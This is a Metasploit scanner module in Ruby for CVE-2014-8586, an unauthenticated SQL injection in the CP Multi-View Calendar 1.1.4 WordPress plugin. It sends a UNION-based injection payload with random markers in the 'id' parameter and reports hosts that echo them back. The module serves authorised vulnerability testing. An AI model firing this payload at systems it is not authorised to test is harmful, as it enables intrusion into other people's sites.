##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'uri'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'WordPress CP Multi-View Calendar Unauthenticated SQL Injection Scanner',
      'Description' => %q{
        This module will scan given instances for an unauthenticated SQL injection
        within the CP Multi-View Calendar plugin v1.1.4 for Wordpress.
      },
      'Author'       =>
        [
          'Joaquin Ramirez Martinez', #discovery
          'bperry' #metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE' , '2014-8586' ],
          [ 'EDB', '36243' ],
          [ 'WPVDB', '7910' ]
        ],
      'DisclosureDate' => 'Mar 03 2015'))

    register_options([
      OptString.new('TARGETURI', [true, 'Target URI of the Wordpress instance', '/'])
    ])
  end

  def run_host(ip)
    right_marker = Rex::Text.rand_text_alpha(5)
    left_marker = Rex::Text.rand_text_alpha(5)
    flag = Rex::Text.rand_text_alpha(5)

    vprint_status("Checking host")

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/'),
      'vars_get' => {
        'action' => 'data_management',
        'cpmvc_do_action' => 'mvparse',
        'f' => 'edit',
        'id' => "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},0x#{flag.unpack("H*")[0]},0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"
      }
    })

    unless res && res.body
      vprint_error("Server did not respond in an expected way")
      return
    end

    result = res.body =~ /#{left_marker}#{flag}#{right_marker}/

    if result
      print_good("Vulnerable to unauthenticated SQL injection within CP Multi-View Calendar 1.1.4 for Wordpress")
      report_vuln({
        :host  => rhost,
        :port  => rport,
        :proto => 'tcp',
        :name  => "Unauthenticated UNION-based SQL injection in CP Multi-View Calendar 1.1.4 for Wordpress",
        :refs  => self.references.select { |ref| ref.ctx_val == "36243" }
      })
    end
  end
end
